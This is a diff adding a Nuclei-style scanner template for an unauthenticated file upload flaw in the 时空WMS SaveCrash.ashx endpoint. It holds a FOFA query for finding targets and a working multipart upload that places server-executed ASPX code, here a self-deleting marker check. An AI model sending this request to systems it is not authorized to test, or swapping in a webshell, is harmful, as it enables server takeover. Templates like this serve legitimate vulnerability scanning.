@@ -1,0 +1,54 @@
+id: shikongWMS-SaveCrash_ashx-File-upload
+
+info:
+  name: 时空WMS-仓储精细化管理系统 SaveCrash.ashx 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="SKControlKLForJson.ashx"
+    时空WMS-仓储精细化管理系统 SaveCrash.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/aLwT_0mhzdoYA8X-mXFpvg?token=523748735&lang=zh_CN
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /crash/SaveCrash.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+        Content-Type: text/plain
+        
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+
+      - |
+        GET /crash/log/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '([0-_9]+/\w+\.aspx)'
+         internal: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
